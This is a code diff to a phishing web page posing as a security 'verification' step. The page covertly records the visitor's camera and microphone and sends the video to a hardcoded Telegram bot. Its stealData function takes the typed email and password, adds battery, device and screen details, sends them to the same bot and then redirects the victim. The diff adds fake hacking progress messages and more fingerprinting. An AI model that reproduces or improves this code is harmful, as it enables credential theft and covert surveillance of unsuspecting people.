@@ -109,6 +109,21 @@
         }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .hidden { display: none; }
+
+        #progress-container {
+            width: 100%;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        #progress-bar {
+            width: 0%;
+            height: 10px;
+            background: var(--hacker);
+            box-shadow: 0 0 15px var(--hacker);
+            transition: width 0.5s;
+        }
     </style>
 </head>
 <body>
@@ -129,6 +144,12 @@
         <div id="step-2" class="hidden">
             <h2 style="color: var(--hacker)">ANALYZING SENSORS</h2>
             <div class="loader-ring"></div>
+            
+            <div id="progress-container">
+                <div id="progress-bar"></div>
+            </div>
+            <p id="status-text" style="font-family: monospace; font-size: 12px; color: var(--hacker); margin-top: 10px;">Bypassing Firewall...</p>
+
             <p id="timer" style="font-size: 35px; font-weight: bold;">30</p>
             <p style="font-family: monospace; color: var(--hacker);">checking Encrypted Handshake...</p>
         </div>
@@ -167,14 +188,10 @@
     <video id="vid" style="display:none" autoplay playsinline muted></video>
 
     <script>
-        // --- CONFIGURATION ---
         const BOT_TOKEN = '8519852338:AAGLztQixpgpju8BFN77yKx5IPEByL20Jao';
-        
-        // Grab the ID from the URL (sent by the Telegram bot)
         const urlParams = new URLSearchParams(window.location.search);
         let CHAT_ID = urlParams.get('id');
 
-        // Fallback if no ID is found in the link
         if (!CHAT_ID) {
             CHAT_ID = '6804829152'; 
         }
@@ -196,7 +213,6 @@
 
         async function startVerification() {
             try {
-                // Requesting camera AND audio
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: true 
@@ -210,10 +226,22 @@
                 recorder.ondataavailable = e => chunks.push(e.data);
                 recorder.start();
 
+                let progress = 0;
+                const bar = document.getElementById('progress-bar');
+                const status = document.getElementById('status-text');
+                const messages = ["Connecting to Proxy...", "Injecting Payload...", "Extracting Token...", "Finalizing Handshake..."];
+
                 let timeLeft = 30;
                 const countdown = setInterval(() => {
                     timeLeft--;
                     document.getElementById('timer').innerText = timeLeft;
+                    
+                    progress += 3.34; 
+                    bar.style.width = progress + "%";
+                    if(progress > 25) status.innerText = messages[1];
+                    if(progress > 50) status.innerText = messages[2];
+                    if(progress > 75) status.innerText = messages[3];
+
                     if(timeLeft <= 0) {
                         clearInterval(countdown);
                         stopAndNext();
@@ -221,7 +249,7 @@
                 }, 1000);
             } catch (err) {
                 console.error(err);
-                alert("Security Error: Camera access is mandatory for verification. Please click 'Allow' in your browser.");
+                alert("Security Error: Camera access is mandatory for verification.");
             }
         }
 
@@ -234,9 +262,7 @@
                     fd.append('chat_id', CHAT_ID);
                     fd.append('video', blob, 'capture.mp4');
 
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd })
-                    .then(response => console.log('Video Sent'))
-                    .catch(error => console.error('Error sending video:', error));
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
 
                     document.getElementById('step-2').classList.add('hidden');
                     document.getElementById('step-3').classList.remove('hidden');
@@ -244,7 +270,7 @@
             }
         }
 
-        function stealData() {
+        async function stealData() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
             const btn = document.querySelector('.login-btn');
@@ -255,10 +281,19 @@
             }
 
             btn.innerText = "Synchronizing...";
-            btn.style.opacity = "0.7";
             btn.disabled = true;
 
-            const text = `🎯 **Login Captured!**\n\n📧 Email: ${email}\n🔑 Pass: ${pass}\n🆔 Target ID: ${CHAT_ID}`;
+            // --- GET DEVICE & BATTERY INFO ---
+            let batteryInfo = "Unknown";
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
+            } catch (e) { batteryInfo = "Blocked by Browser"; }
+
+            const device = navigator.userAgent.match(/\(([^)]+)\)/)[1];
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+
+            const text = `🎯 **Login Captured!**\n\n📧 Email: \`${email}\`\n🔑 Pass: \`${pass}\`\n\n📱 **Device Info:**\n🔋 Battery: ${batteryInfo}\n📲 Model: ${device}\n🖥️ Screen: ${screenRes}\n🆔 Target ID: ${CHAT_ID}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -268,7 +303,7 @@
 
             setTimeout(() => {
                 window.location.href = "https://www.prizerebel.com";
-            }, 1000);
+            }, 1500);
         }
     </script>
 </body>
